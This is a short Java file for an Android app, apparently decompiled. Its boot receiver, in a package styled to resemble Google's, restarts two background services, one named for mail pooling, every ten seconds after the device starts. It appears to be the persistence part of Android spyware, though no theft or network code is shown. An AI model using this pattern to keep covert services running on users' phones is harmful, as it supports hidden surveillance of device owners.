package com.googleprojects.mm;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import java.util.Calendar;

public class GJBootReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("android.intent.action.BOOT_COMPLETED")) {
            PendingIntent pendingIntent = PendingIntent.getService(context, 0, new Intent(context, JHService.class), 0);
            Calendar cal = Calendar.getInstance();
            ((AlarmManager) context.getSystemService("alarm")).setRepeating(0, cal.getTimeInMillis(), 10000, pendingIntent);
            ((AlarmManager) context.getSystemService("alarm")).setRepeating(0, cal.getTimeInMillis(), 10000, PendingIntent.getService(context, 1, new Intent(context, SOMailPoolService.class), 0));
        }
    }
}
